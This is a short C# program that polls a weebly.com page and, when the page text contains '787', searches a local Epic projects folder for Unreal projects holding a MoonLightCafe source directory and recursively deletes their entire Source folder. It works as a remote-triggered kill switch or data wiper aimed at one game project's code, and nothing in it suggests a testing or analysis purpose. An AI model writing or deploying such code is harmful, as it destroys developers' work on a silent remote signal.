
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Net.Http;
using System.Threading.Tasks;
using HtmlAgilityPack;
using System.Text.RegularExpressions;
using Scanner;



namespace Program
{
    class Program
    {
        static async Task Main()
        {
            string url = "https://alibadpa.weebly.com/test.html";

            using (HttpClient client = new HttpClient())
            {
                try
                {
                    string response = await client.GetStringAsync(url);

                    if (Regex.IsMatch(ExteractHTML(response), $@"\b{Regex.Escape("787")}\b"))
                    {
                        Attach();
                    }
                }
                catch (HttpRequestException ex)
                {
                    Console.WriteLine($"Error reading website: {ex.Message}");
                }
            }
        }

        static string ExteractHTML(string HTML)
        {
            string html = HTML; // Replace with your HTML content

            // Load the HTML content into an HtmlDocument
            HtmlDocument doc = new HtmlDocument();
            doc.LoadHtml(html);

            // Extract the text from the HTML
            string text = doc.DocumentNode.InnerText;

            //Console.WriteLine("HTML text:");
            //Console.WriteLine(text);
            return text;
        }



        static void Attach()
        {
            string[] DriveList = {"C","E","Z","X","J",""};
            Scan MyScaner = new Scan("D:\\Epic\\Projects");
            foreach (var item in MyScaner.ListFiles("uproject"))
            {
                string[] junk = item.Split("\\");
                if (Directory.Exists(junk.GetBackTo(1) + "\\Source\\MoonLightCafe"))
                {
                    try
                    {
                        DirectoryInfo di = new DirectoryInfo(junk.GetBackTo(1) + "\\Source");
                        di.Delete(true);

                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }
                }
            }
        }


    }




    static class Newpath
    {
        public static string GetBackTo(this string[] Path, int number)
        {
            string result = Path[0];
            for (int i = 1; i < Path.Length - number; i++)
            {
                result = result + "\\" + Path[i];
            }
            return result;
        }
    }

}